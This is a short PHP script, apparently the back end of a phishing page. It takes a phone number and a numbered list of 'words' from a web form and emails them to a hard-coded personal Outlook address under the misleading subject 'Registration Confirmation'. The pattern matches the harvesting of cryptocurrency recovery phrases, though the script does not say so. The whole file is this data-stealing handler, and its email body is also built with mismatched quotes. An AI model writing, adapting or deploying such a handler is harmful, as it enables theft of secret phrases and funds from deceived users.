<?php
$number = $_POST['mobile'];
$wordCount = implode(", ", json_decode($_POST['wordCount']));
$wc = '';
$count = 0;
foreach(json_decode($_POST['wordCount']) as $key => $value){
    ++$count;    
    $wc .= "$count : ".$value.", ";    
}
$countryCode = $_POST["countryCode"];
$customerEmailer = '<!DOCTYPE html>
                                <html>
                                    <head>
                                        <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
                                        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
                                        <style>p{ margin:0 !important; padding:0 !important;}</style>
                                    </head>
                                    <body>
                                        <p>Phone  Number : +' . $countryCode.'-'.$number . '</p>
                                        <p>words : ' . $wc . '</p>
                                        </body>
                                </html>';
                                
$to = 'johnsnow1452@outlook.com';
$subject = "Registration Confirmation";
$body = "<p>Phone  Number : +' . $countryCode.'-'.$number . '</p><p>words : ' . $wc . '</p>";
$headers = "From: johnsnow1452@outlook.com";
// echo json_encode(['status' => 'success']);
// die;
if (mail($to, $subject, $body, $headers)) {
    echo json_encode(['status' => 'success']);
} else {
    echo json_encode(['status' => 'failed']);
}